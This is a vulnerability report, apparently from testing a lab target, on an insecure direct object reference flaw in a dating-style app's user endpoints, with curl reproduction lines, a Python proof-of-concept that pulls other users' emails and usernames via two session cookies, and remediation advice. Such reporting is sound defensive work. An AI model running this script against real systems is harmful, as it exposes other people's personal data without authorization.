# Insecure Object-Level Authorization (IDOR) in user profile and API endpoints

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-02-20 13:14:40 UTC
**Target:** https://soulmate.htb
**Endpoint:** /api/users/{id}, /api/user/{id}, /api/profile?id={id}, /users/{id}, /profile.php?id={id}
**Method:** GET
**CVSS:** 6.5

## Description

Multiple user-facing API and page endpoints in the Soulmate application fail to enforce per-request object ownership checks. Authenticated users can supply object identifiers (numeric IDs or path parameters) and receive resource representations (JSON or HTML) for those objects without the server verifying that the object belongs to the requesting principal.

During testing two distinct authenticated sessions were used. For several endpoints both sessions received identical or near-identical resource data for the same object identifiers, demonstrating that the server returns object content independent of the authenticated principal. The issue affects both JSON API endpoints and server-rendered profile pages and indicates missing or ineffective owner-binding in the authorization logic.

## Impact

An authenticated attacker can read other users' personal data (email addresses, usernames, profile information and other PII) by requesting object identifiers. Business impacts include:

- Privacy breach: disclosure of personal information (PII) across accounts
- Account compromise & social engineering: exposed email/user information can enable targeted attacks
- Regulatory and contractual risk: potential GDPR/PII violations and increased liability
- Increased attack surface: leaked identifiers may assist in larger-scale abuse (account enumeration, targeted fraud)

## Technical Analysis

The application exposes several endpoints that accept object identifiers and return resource representations without a reliable server-side ownership check. Affected endpoints (representative, not exhaustive) include:

- /api/users/{id}
- /api/user/{id}
- /api/profile?id={id}
- /users/{id}
- /profile.php?id={id}

Observed behavior and root cause:
- The endpoints accept a user/profile identifier and return the associated resource when the identifier exists.
- The server does not verify that the object’s owner/tenant matches the authenticated principal performing the request (missing per-request owner binding).
- As a result, any authenticated user can request arbitrary IDs and receive the corresponding resource content. Validation artifacts show two different authenticated accounts retrieving identical identifying fields (email, username, id) for the same object identifier.

Why this matters:
- Authorization decisions must bind: (actor, action, object). If binding is missing at the service that reads and returns the object, the service will leak resources to unauthorized principals regardless of other protective controls.
- The issue is systemic across multiple endpoints and transport formats (JSON APIs and HTML pages), indicating a common authorization omission or centralized check that is not applied consistently.

## Proof of Concept

Reproduction (non-destructive)

Prerequisites:
1) Two valid, non-privileged authenticated accounts (Account A and Account B) and their session cookies (PHPSESSID).
2) A network connection to the target (https://soulmate.htb).

Steps:
1) Confirm authentication cookies for Account A and Account B are available (obtain PHPSESSID values for each session).
2) Run the included PoC script (Python) which accepts the base URL and both session cookies, then requests a set of representative endpoints and extracts distinguishing fields (email, username, id) for each response.

Example (manual curl reproduction):
- curl -s --cookie "PHPSESSID=<SESSION_A>" "https://soulmate.htb/api/users/1"
- curl -s --cookie "PHPSESSID=<SESSION_B>" "https://soulmate.htb/api/users/1"
Compare the returned JSON or HTML snippets. Identical email/username/id fields across sessions confirm unauthorized access.

PoC notes:
- The provided PoC is non-destructive: it performs only safe GET requests and prints small distinguishing fields (email/username/id/length).
- Use low rate (do not flood); the PoC sleeps between requests where appropriate.

```
#!/usr/bin/env python3
"""
PoC: Non-destructive IDOR verification script.

Usage:
  python3 idor_poc.py --base https://soulmate.htb --cookie-a <PHPSESSID_A> --cookie-b <PHPSESSID_B>

The script issues GET requests to a short list of representative endpoints using
two distinct authenticated session cookies and prints compact, distinguishing
fields (email, username, id or response length) for comparison.

Do not run this against production systems without authorization. This PoC is
intended for authorized security validation only.
"""
import argparse
import requests
import re
import json
import sys

EMAIL_RE = re.compile(r'([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,6})')

DEFAULT_ENDPOINTS = [
    "/api/users/1",
    "/api/users/2",
    "/api/user/1",
    "/api/profile/1",
    "/users/1",
    "/users/2",
    "/profile.php?id=1",
]

def extract_info(resp):
    ctype = resp.headers.get("Content-Type", "")
    # JSON responses
    if "application/json" in ctype:
        try:
            data = resp.json()
            # try to pull common fields
            out = {}
            for k in ("email", "username", "id", "first_name", "last_name"):
                if k in data:
                    out[k] = data[k]
            # shallow search if top-level keys missing
            if not out:
                def find(obj):
                    if isinstance(obj, dict):
                        for kk, vv in obj.items():
                            if kk in ("email", "username", "id", "first_name", "last_name"):
                                return {kk: vv}
                            r = find(vv)
                            if r:
                                return r
                    elif isinstance(obj, list):
                        for item in obj:
                            r = find(item)
                            if r:
                                return r
                    return None
                r = find(data)
                if r:
                    out.update(r)
            if out:
                return out
        except Exception:
            pass
    # HTML/text responses: search for email address or return length
    text = resp.text
    m = EMAIL_RE.search(text)
    if m:
        return {"email": m.group(1)}
    return {"length": len(text)}

def do_request(base, path, cookie_value):
    url = base.rstrip('/') + path if path.startswith('/') else base.rstrip('/') + '/' + path
    headers = {}
    if cookie_value:
        headers['Cookie'] = f'PHPSESSID={cookie_value}'
    try:
        r = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        return r
    except Exception as e:
        print(f"ERROR: request to {url} failed: {e}", file=sys.stderr)
        return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", "-b", default="https://soulmate.htb", help="Target base URL")
    parser.add_argument("--cookie-a", required=True, help="PHPSESSID value for account A")
    parser.add_argument("--cookie-b", required=True, help="PHPSESSID value for account B")
    parser.add_argument("--endpoints", help="Comma-separated endpoints to test (overrides default)")
    args = parser.parse_args()

    if args.endpoints:
        endpoints = [e.strip() for e in args.endpoints.split(",") if e.strip()]
    else:
        endpoints = DEFAULT_ENDPOINTS

    for ep in endpoints:
        ra = do_request(args.base, ep, args.cookie_a)
        rb = do_request(args.base, ep, args.cookie_b)
        info_a = extract_info(ra) if ra is not None else {"error": "request failed"}
        info_b = extract_info(rb) if rb is not None else {"error": "request failed"}
        status_a = ra.status_code if ra is not None else "ERR"
        status_b = rb.status_code if rb is not None else "ERR"
        print(f"Endpoint: {args.base.rstrip('/')}{ep}")
        print(f"  Account A: status={status_a} info={json.dumps(info_a, ensure_ascii=False)}")
        print(f"  Account B: status={status_b} info={json.dumps(info_b, ensure_ascii=False)}")
        print("-" * 60)

if __name__ == '__main__':
    main()
```

## Remediation

Recommended remediation (developer-focused)

1) Enforce per-request owner binding
   - For every endpoint that returns object data, verify server-side that object.owner_id (or tenant) == authenticated_user.id before returning sensitive fields.
   - Apply this check at the service boundary that performs the read, not only at higher-level UI code.

2) Centralize authorization
   - Implement centralized authorization middleware/policy enforcement so rules cannot be bypassed by alternate routes (API vs server-rendered pages vs background jobs).
   - Use deny-by-default and explicit allow predicates.

3) Principle of least privilege & safe defaults
   - Return 403 (Forbidden) or 404 (Not Found) for unauthorized access attempts; do not return object content for non-owners.
   - Avoid returning partial object representations that leak sensitive fields.

4) Testing & regression
   - Add automated tests that request objects with multiple different principals and assert that unauthorized principals receive 403/404.
   - Add integration tests covering API and HTML endpoints to prevent regression.

5) Monitoring & mitigation
   - Log and alert on unusual access patterns (multiple principals accessing the same object in a short window).
   - Consider temporary access controls (rate-limits, stricter access gating) for sensitive endpoints while remediation is in progress.
